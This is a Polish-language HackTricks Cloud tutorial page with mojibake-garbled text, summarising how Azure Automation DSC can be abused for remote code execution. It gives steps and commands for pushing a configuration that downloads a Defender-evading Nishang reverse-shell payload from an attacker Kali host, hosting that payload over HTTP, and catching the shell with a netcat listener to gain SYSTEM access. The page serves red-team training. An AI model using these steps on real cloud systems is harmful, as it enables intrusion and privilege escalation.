# Az - Wykonanie zdalnego kodu w konfiguracji stanu

{% hint style="success" %}
Ucz siƒô i ƒáwicz Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Ucz siƒô i ƒáwicz Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd≈∫ [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siƒô sztuczkami hackingowymi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori√≥w na GitHubie.

</details>
{% endhint %}

**Sprawd≈∫ pe≈Çny post w:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Podsumowanie przygotowania infrastruktury serwera zdalnego (C2) i krok√≥w

#### PrzeglƒÖd

Proces polega na skonfigurowaniu infrastruktury serwera zdalnego do hostowania zmodyfikowanego ≈Çadunku Nishang `Invoke-PowerShellTcp.ps1`, nazwanego `RevPS.ps1`, zaprojektowanego w celu ominiƒôcia Windows Defender. ≈Åadunek jest serwowany z maszyny Kali Linux o IP `40.84.7.74` przy u≈ºyciu prostego serwera HTTP w Pythonie. Operacja jest realizowana w kilku krokach:

#### Krok 1 ‚Äî Utw√≥rz pliki

* **Wymagane pliki:** Potrzebne sƒÖ dwa skrypty PowerShell:
1. `reverse_shell_config.ps1`: Plik Desired State Configuration (DSC), kt√≥ry pobiera i wykonuje ≈Çadunek. Mo≈ºna go uzyskaƒá z [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1).
2. `push_reverse_shell_config.ps1`: Skrypt do publikacji konfiguracji na VM, dostƒôpny na [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).
* **Dostosowanie:** Zmienne i parametry w tych plikach muszƒÖ byƒá dostosowane do specyficznego ≈õrodowiska u≈ºytkownika, w tym nazwy zasob√≥w, ≈õcie≈ºki plik√≥w oraz identyfikatory serwera/≈Çadunku.

#### Krok 2 ‚Äî Spakuj plik konfiguracyjny

* Plik `reverse_shell_config.ps1` jest kompresowany do pliku `.zip`, co czyni go gotowym do transferu do Azure Storage Account.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Krok 3 ‚Äî Ustaw kontekst przechowywania i przesy≈Çanie

* Zszyfrowany plik konfiguracyjny jest przesy≈Çany do zdefiniowanego kontenera przechowywania Azure, azure-pentest, za pomocƒÖ polecenia Set-AzStorageBlobContent z Azure.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Krok 4 ‚Äî Przygotowanie Kali Box

* Serwer Kali pobiera ≈Çadunek RevPS.ps1 z repozytorium GitHub.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
* Skrypt jest edytowany, aby okre≈õliƒá docelowƒÖ maszynƒô wirtualnƒÖ Windows i port dla odwrotnego pow≈Çoki.

#### Step 5 ‚Äî Publish Configuration File

* Plik konfiguracyjny jest wykonywany, co skutkuje wdro≈ºeniem skryptu odwrotnej pow≈Çoki w okre≈õlonej lokalizacji na maszynie wirtualnej Windows.

#### Step 6 ‚Äî Host Payload and Setup Listener

* Uruchamiany jest Python SimpleHTTPServer, aby hostowaƒá ≈Çadunek, wraz z nas≈Çuchiwaczem Netcat do przechwytywania przychodzƒÖcych po≈ÇƒÖcze≈Ñ.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
* Zaplanowane zadanie wykonuje ≈Çadunek, osiƒÖgajƒÖc uprawnienia na poziomie SYSTEM.

#### Wnioski

Pomy≈õlne wykonanie tego procesu otwiera liczne mo≈ºliwo≈õci dalszych dzia≈Ça≈Ñ, takich jak zrzut po≈õwiadcze≈Ñ lub rozszerzenie ataku na wiele maszyn wirtualnych. Przewodnik zachƒôca do dalszej nauki i kreatywno≈õci w dziedzinie Azure Automation DSC.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
